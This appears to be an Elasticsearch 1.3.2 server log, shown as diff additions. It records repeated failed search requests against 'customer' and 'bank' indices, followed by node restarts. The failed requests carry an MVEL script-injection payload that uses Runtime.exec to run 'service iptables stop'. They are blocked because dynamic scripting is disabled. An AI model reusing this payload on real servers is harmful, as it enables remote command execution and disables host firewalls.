+org.elasticsearch.search.SearchParseException: [customer][2]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,871][DEBUG][action.search.type       ] [Monica Rappaccini] [customer][4], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
+org.elasticsearch.search.SearchParseException: [customer][4]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,872][DEBUG][action.search.type       ] [Monica Rappaccini] [bank][4], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
+org.elasticsearch.search.SearchParseException: [bank][4]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,875][DEBUG][action.search.type       ] [Monica Rappaccini] [customer][0], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
+org.elasticsearch.search.SearchParseException: [customer][0]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,875][DEBUG][action.search.type       ] [Monica Rappaccini] [customer][1], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be]
+org.elasticsearch.search.SearchParseException: [customer][1]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,876][DEBUG][action.search.type       ] [Monica Rappaccini] All shards failed for phase: [query]
+[2015-08-21 10:08:41,154][INFO ][node                     ] [Monica Rappaccini] stopping ...
+[2015-08-21 10:08:41,197][INFO ][node                     ] [Monica Rappaccini] stopped
+[2015-08-21 10:08:41,197][INFO ][node                     ] [Monica Rappaccini] closing ...
+[2015-08-21 10:08:41,238][INFO ][node                     ] [Monica Rappaccini] closed
+[2015-08-21 10:10:14,555][INFO ][node                     ] [Living Lightning] version[1.3.2], pid[28719], build[dee175d/2014-08-13T14:29:30Z]
+[2015-08-21 10:10:14,555][INFO ][node                     ] [Living Lightning] initializing ...
+[2015-08-21 10:10:14,559][INFO ][plugins                  ] [Living Lightning] loaded [], sites []
+[2015-08-21 10:10:17,392][INFO ][node                     ] [Living Lightning] initialized
+[2015-08-21 10:10:17,392][INFO ][node                     ] [Living Lightning] starting ...
+[2015-08-21 10:10:17,461][INFO ][transport                ] [Living Lightning] bound_address {inet[/0:0:0:0:0:0:0:0:9300]}, publish_address {inet[/172.31.2.104:9300]}
+[2015-08-21 10:10:17,475][INFO ][discovery                ] [Living Lightning] elasticsearch/RLF47CxOTgO1fNnZYE8Ekg
+[2015-08-21 10:10:20,492][INFO ][cluster.service          ] [Living Lightning] new_master [Living Lightning][RLF47CxOTgO1fNnZYE8Ekg][ip-172-31-2-104][inet[/172.31.2.104:9300]], reason: zen-disco-join (elected_as_master)
+[2015-08-21 10:10:20,521][INFO ][http                     ] [Living Lightning] bound_address {inet[/0:0:0:0:0:0:0:0:9200]}, publish_address {inet[/172.31.2.104:9200]}
+[2015-08-21 10:10:20,522][INFO ][node                     ] [Living Lightning] started
+[2015-08-21 10:10:21,376][INFO ][gateway                  ] [Living Lightning] recovered [2] indices into cluster_state
+[2015-08-21 10:11:21,704][INFO ][node                     ] [Living Lightning] stopping ...
+[2015-08-21 10:11:21,738][INFO ][node                     ] [Living Lightning] stopped
+[2015-08-21 10:11:21,738][INFO ][node                     ] [Living Lightning] closing ...
+[2015-08-21 10:11:21,743][INFO ][node                     ] [Living Lightning] closed
+[2015-08-21 10:11:23,925][INFO ][node                     ] [Chameleon] version[1.3.2], pid[29114], build[dee175d/2014-08-13T14:29:30Z]
+[2015-08-21 10:11:23,925][INFO ][node                     ] [Chameleon] initializing ...
+[2015-08-21 10:11:23,929][INFO ][plugins                  ] [Chameleon] loaded [], sites []
+[2015-08-21 10:11:26,768][INFO ][node                     ] [Chameleon] initialized
+[2015-08-21 10:11:26,768][INFO ][node                     ] [Chameleon] starting ...
+[2015-08-21 10:11:26,829][INFO ][transport                ] [Chameleon] bound_address {inet[/0:0:0:0:0:0:0:0:9300]}, publish_address {inet[/172.31.2.104:9300]}
+[2015-08-21 10:11:26,843][INFO ][discovery                ] [Chameleon] elasticsearch/HhFiS5GxRGm8G3TWJKi17w
+[2015-08-21 10:11:29,860][INFO ][cluster.service          ] [Chameleon] new_master [Chameleon][HhFiS5GxRGm8G3TWJKi17w][ip-172-31-2-104][inet[/172.31.2.104:9300]], reason: zen-disco-join (elected_as_master)
+[2015-08-21 10:11:29,889][INFO ][http                     ] [Chameleon] bound_address {inet[/0:0:0:0:0:0:0:0:9200]}, publish_address {inet[/172.31.2.104:9200]}
+[2015-08-21 10:11:29,889][INFO ][node                     ] [Chameleon] started
+[2015-08-21 10:11:30,721][INFO ][gateway                  ] [Chameleon] recovered [2] indices into cluster_state
+[2015-08-21 10:19:25,291][INFO ][node                     ] [Chameleon] stopping ...
+[2015-08-21 10:19:25,339][INFO ][node                     ] [Chameleon] stopped
+[2015-08-21 10:19:25,339][INFO ][node                     ] [Chameleon] closing ...
+[2015-08-21 10:19:25,343][INFO ][node                     ] [Chameleon] closed
+[2015-08-21 10:19:27,660][INFO ][node                     ] [Midnight Sun] version[1.3.2], pid[29315], build[dee175d/2014-08-13T14:29:30Z]
+[2015-08-21 10:19:27,661][INFO ][node                     ] [Midnight Sun] initializing ...
+[2015-08-21 10:19:27,664][INFO ][plugins                  ] [Midnight Sun] loaded [], sites []
+[2015-08-21 10:19:30,491][INFO ][node                     ] [Midnight Sun] initialized
+[2015-08-21 10:19:30,491][INFO ][node                     ] [Midnight Sun] starting ...
+[2015-08-21 10:19:30,552][INFO ][transport                ] [Midnight Sun] bound_address {inet[/0:0:0:0:0:0:0:0:9300]}, publish_address {inet[/172.31.2.104:9300]}
+[2015-08-21 10:19:30,566][INFO ][discovery                ] [Midnight Sun] elasticsearch/DBxOakV0TeqxLxFH9Hp1Zw
+[2015-08-21 10:19:33,582][INFO ][cluster.service          ] [Midnight Sun] new_master [Midnight Sun][DBxOakV0TeqxLxFH9Hp1Zw][ip-172-31-2-104][inet[/172.31.2.104:9300]], reason: zen-disco-join (elected_as_master)
+[2015-08-21 10:19:33,610][INFO ][http                     ] [Midnight Sun] bound_address {inet[/0:0:0:0:0:0:0:0:9200]}, publish_address {inet[/172.31.2.104:9200]}
+[2015-08-21 10:19:33,610][INFO ][node                     ] [Midnight Sun] started
+[2015-08-21 10:19:34,417][INFO ][gateway                  ] [Midnight Sun] recovered [2] indices into cluster_state
